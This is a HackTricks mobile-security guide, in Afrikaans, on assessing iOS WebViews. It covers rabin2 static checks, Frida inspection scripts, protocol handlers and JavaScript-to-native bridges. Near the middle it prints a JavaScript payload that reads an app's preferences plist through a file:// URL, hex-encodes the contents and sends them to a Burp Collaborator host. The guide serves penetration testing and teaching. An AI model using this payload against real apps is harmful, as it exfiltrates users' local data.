# iOS WebViews

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

Die kode van hierdie bladsy is onttrek van [hier](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Kyk na die bladsy vir verdere besonderhede.


## WebViews-tipes

WebViews word binne programme gebruik om webinhoud interaktief weer te gee. Verskillende tipes WebViews bied verskillende funksionaliteite en sekuriteitskenmerke vir iOS-programme. Hier is 'n kort oorsig:

- **UIWebView**, wat vanaf iOS 12 nie meer aanbeveel word nie as gevolg van sy gebrek aan ondersteuning vir die uitskakeling van **JavaScript**, wat dit vatbaar maak vir skripsinjeksie en **Cross-Site Scripting (XSS)**-aanvalle.

- **WKWebView** is die voorkeur-opsie vir die inkorporering van webinhoud in programme, en bied verbeterde beheer oor die inhoud en sekuriteitskenmerke. **JavaScript** is standaard geaktiveer, maar dit kan uitgeskakel word indien nodig. Dit ondersteun ook funksies om te voorkom dat JavaScript outomaties vensters oopmaak en verseker dat alle inhoud veilig gelaai word. Daarbenewens minimaliseer die argitektuur van **WKWebView** die risiko van geheuekorruptie wat die hoofprogramproses kan affekteer.

- **SFSafariViewController** bied 'n gestandaardiseerde webblaaier-ervaring binne programme, wat herkenbaar is aan sy spesifieke uitleg, insluitend 'n lees-slegs-adresveld, deel- en navigasieknoppies, en 'n direkte skakel om inhoud in Safari oop te maak. Anders as **WKWebView** kan **JavaScript** nie uitgeskakel word in **SFSafariViewController** nie, wat ook koekies en data deel met Safari en sodoende die gebruiker se privaatheid van die app handhaaf. Dit moet volgens die App Store-riglyne duidelik vertoon word.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## Opsomming van WebViews-konfigurasie-ondersoek

### **Oorsig van Statische Analise**

In die proses van die ondersoek van WebViews-konfigurasies, word daar gefokus op twee prim√™re tipes: **UIWebView** en **WKWebView**. Om hierdie WebViews binne 'n bin√™re l√™er te identifiseer, word bevele gebruik om spesifieke klasverwysings en inisialisasiemetodes te soek.

- **UIWebView-identifikasie**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Hierdie bevel help om instansies van **UIWebView** op te spoor deur te soek na teksstrings wat daarmee verband hou in die bin√™re l√™er.

- **WKWebView Identifikasie**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
Op soortgelyke wyse soek hierdie bevel die bin√™re l√™er vir teksreekse wat dui op die gebruik van **WKWebView**.

Verder, om uit te vind hoe 'n **WKWebView** ge√Ønisialiseer word, word die volgende bevel uitgevoer, wat die metodesignatuur teiken wat verband hou met sy inisialisering:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **JavaScript-konfigurasieverifikasie**

Vir **WKWebView** word daar beklemtoon dat dit 'n goeie praktyk is om JavaScript te deaktiveer tensy dit nodig is. Die saamgestelde bin√™re l√™er word deursoek om te bevestig dat die `javaScriptEnabled` eienskap op `false` ingestel is, om te verseker dat JavaScript gedeaktiveer is:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Slegs Sekure Inhoud Verifikasie**

**WKWebView** bied die vermo√´ om gemengde inhoudsprobleme te identifiseer, in teenstelling met **UIWebView**. Dit word nagegaan deur die gebruik van die `hasOnlySecureContent` eienskap om te verseker dat alle bladsybronne deur veilige verbindinge gelaai word. Die soektog in die saamgestelde bin√™re kode word as volg uitgevoer:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Dinamiese Analise-insigte**

Dinamiese analise behels die inspeksie van die heap vir WebView-instanties en hul eienskappe. 'n Skrip met die naam `webviews_inspector.js` word gebruik vir hierdie doel, wat `UIWebView`, `WKWebView`, en `SFSafariViewController`-instanties teiken. Dit registreer inligting oor gevonde instanties, insluitend URL's en instellings wat verband hou met JavaScript en veilige inhoud.

Heap-inspeksie kan uitgevoer word deur `ObjC.choose()` te gebruik om WebView-instanties te identifiseer en die `javaScriptEnabled` en `hasonlysecurecontent`-eienskappe te kontroleer.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Die skrip word uitgevoer met:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Belangrike uitkomste**:
- Gevalle van WebViews word suksesvol opgespoor en ondersoek.
- JavaScript-aktivering en veilige inhoudsinstellings word geverifieer.

Hierdie opsomming omvat die kritieke stappe en opdragte wat betrokke is by die analise van WebView-konfigurasies deur statiese en dinamiese benaderings, met die klem op sekuriteitskenmerke soos JavaScript-aktivering en gemengde inhoudsdeteksie.

## WebView-protokolhantering

Die hantering van inhoud in WebViews is 'n kritieke aspek, veral wanneer dit kom by verskillende protokolle soos `http(s)://`, `file://`, en `tel://`. Hierdie protokolle maak dit moontlik om beide afgele√´ en plaaslike inhoud binne programme te laai. Dit word beklemtoon dat wanneer plaaslike inhoud gelaai word, voorbehoudsmaatre√´ls getref moet word om te voorkom dat gebruikers die l√™ernaam of -pad be√Ønvloed en die inhoud self wysig.

**WebViews** bied verskillende metodes vir inhoudsoplaai. Vir **UIWebView**, wat nou verouderd is, word metodes soos `loadHTMLString:baseURL:` en `loadData:MIMEType:textEncodingName:baseURL:` gebruik. **WKWebView** maak daarenteen gebruik van `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:`, en `loadRequest:` vir webinhoud. Metodes soos `pathForResource:ofType:`, `URLForResource:withExtension:`, en `init(contentsOf:encoding:)` word tipies gebruik vir die laai van plaaslike l√™ers. Die metode `loadFileURL:allowingReadAccessToURL:` is veral merkwaardig vir sy vermo√´ om 'n spesifieke URL of gids in die WebView te laai, wat moontlik sensitiewe data kan blootstel as 'n gids gespesifiseer word.

Om hierdie metodes in die bronkode of saamgestelde bin√™re l√™er te vind, kan opdragte soos die volgende gebruik word:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Met betrekking tot **l√™ertoegang** maak UIWebView dit universeel moontlik, terwyl WKWebView `allowFileAccessFromFileURLs` en `allowUniversalAccessFromFileURLs` instellings introduceer om toegang vanaf l√™er-URL's te bestuur, waar beide standaard vals is.

'n Voorbeeld van 'n Frida-skripsie word verskaf om **WKWebView**-konfigurasies vir sekuriteitsinstellings te ondersoek:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Laastens, 'n voorbeeld van 'n JavaScript-vraglas wat gemik is op die uitlek van plaaslike l√™ers, demonstreer die potensi√´le veiligheidsrisiko wat verband hou met verkeerd gekonfigureerde WebViews. Hierdie vraglas kodeer l√™erinhoude na heksformaat voordat dit na 'n bediener gestuur word, wat die belangrikheid van streng veiligheidsmaatre√´ls in WebView-implementasies beklemtoon.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## Inheemse Metodes Blootgestel deur WebViews

## Begrip van WebView Inheemse Koppelvlakke in iOS

Vanaf iOS 7 het Apple API's verskaf vir **kommunikasie tussen JavaScript in 'n WebView en inheemse** Swift- of Objective-C-voorwerpe. Hierdie integrasie word hoofsaaklik gefasiliteer deur twee metodes:

- **JSContext**: 'n JavaScript-funksie word outomaties geskep wanneer 'n Swift- of Objective-C-blok gekoppel word aan 'n identifiseerder binne 'n `JSContext`. Dit maak naadlose integrasie en kommunikasie tussen JavaScript en inheemse kode moontlik.
- **JSExport-protokol**: Deur die `JSExport`-protokol te erf, kan inheemse eienskappe, instansiemetodes en klassemetodes aan JavaScript blootgestel word. Dit beteken dat enige veranderinge wat in die JavaScript-omgewing aangebring word, weerspie√´l word in die inheemse omgewing, en andersom. Dit is egter noodsaaklik om te verseker dat sensitiewe data nie onbedoeld deur hierdie metode blootgestel word nie.

### Toegang tot `JSContext` in Objective-C

In Objective-C kan die `JSContext` vir 'n `UIWebView` verkry word met die volgende lyn kode:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Kommunikasie met `WKWebView`

Vir `WKWebView` is direkte toegang tot `JSContext` nie beskikbaar nie. In plaas daarvan word boodskapstuur gebruik deur die `postMessage`-funksie, wat JavaScript in staat stel om met die inheemse toepassing te kommunikeer. Handlers vir hierdie boodskappe word so opgestel dat JavaScript veilig met die inheemse toepassing kan interaksie h√™:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interaksie en Toetsing

JavaScript kan met die inheemse laag interaksie h√™ deur 'n skripsboodskaphanterer te definieer. Dit maak operasies soos die aanroep van inheemse funksies vanaf 'n webblad moontlik:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Om die resultaat van 'n inheemse funksie-oproep vas te vang en te manipuleer, kan die terugroepfunksie binne die HTML oorskryf word:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
Die inheemse kant hanteer die JavaScript-oproep soos getoon in die `JavaScriptBridgeMessageHandler`-klas, waar die resultaat van operasies soos die vermenigvuldiging van getalle verwerk en terug na JavaScript gestuur word vir vertoning of verdere manipulasie:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## Debugging iOS WebViews

(Tutoriaal gebaseer op di√© van [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Om webinhoud binne iOS-webweergawes effektief te ontleed, is 'n spesifieke opset nodig wat betrekking het op Safari se ontwikkelertools, aangesien boodskappe wat na `console.log()` gestuur word nie in Xcode-logboeke vertoon word nie. Hier is 'n vereenvoudigde gids wat die sleutelstappe en vereistes beklemtoon:

- **Voorbereiding op iOS-toestel**: Die Safari Web Inspector moet geaktiveer word op jou iOS-toestel. Dit word gedoen deur na **Instellings > Safari > Gevorderd** te gaan en die _Web Inspector_ te aktiveer.

- **Voorbereiding op macOS-toestel**: Op jou macOS-ontwikkelingsrekenaar moet jy ontwikkelertools in Safari aktiveer. Begin Safari, gaan na **Safari > Voorkeure > Gevorderd** en kies die opsie om die _Ontwikkel-menu te wys_.

- **Verbinding en ontleedwerk**: Nadat jy jou iOS-toestel aan jou macOS-rekenaar gekoppel het en jou toepassing begin het, gebruik Safari op jou macOS-toestel om die webweergawe wat jy wil ontleed, te kies. Navigeer na _Ontwikkel_ in Safari se menubalk, hou oor jou iOS-toestel se naam om 'n lys van webweergawe-eksemplare te sien, en kies die eksemplaar wat jy wil ondersoek. 'n Nuwe Safari Web Inspector-venster sal vir hierdie doel oopmaak.

Wees egter bewus van die beperkings:

- Ontleedwerk met hierdie metode vereis 'n macOS-toestel aangesien dit afhanklik is van Safari.
- Slegs webweergawes in toepassings wat deur Xcode op jou toestel gelaai is, is geskik vir ontleedwerk. Webweergawes in programme wat via die App Store of Apple Configurator ge√Ønstalleer is, kan nie op hierdie manier ontleed word nie.


## Verwysings

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
